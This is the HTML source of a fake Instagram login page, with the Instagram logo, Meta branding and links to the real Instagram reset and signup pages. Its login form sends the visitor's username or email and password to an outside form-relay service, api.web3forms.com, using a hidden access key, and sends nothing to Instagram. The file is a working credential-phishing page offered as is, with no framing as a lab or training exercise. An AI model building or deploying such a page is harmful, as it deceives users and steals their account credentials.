<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="language-selector">English (US)</div>
    <div class="logo">
      <img src="instalogo.jpg" alt="Instagram Logo">
    </div>
    <div id="inp-div">
    <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
      <input type="hidden" name="access_key" value="b78fbdbc-3f98-4f59-a0e1-11edd252a0ac">
      <input type="text" class="input-field" placeholder="Username, email or mobile number" name="username_or_email" required>
      <input type="password" class="input-field" placeholder="Password" name="text" required>
      <button type="submit" class="btn-login">Log in</button>
      </div>
      <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
      <br>
      <div id="footed">
      <a href="https://www.instagram.com/accounts/emailsignup/" class="create-account">Create new account</a>
      <div class="meta">
        <i class="fab fa-meta"></i>Meta
      </div>
      </div>
    </form>
  </div>


</body>
</html>
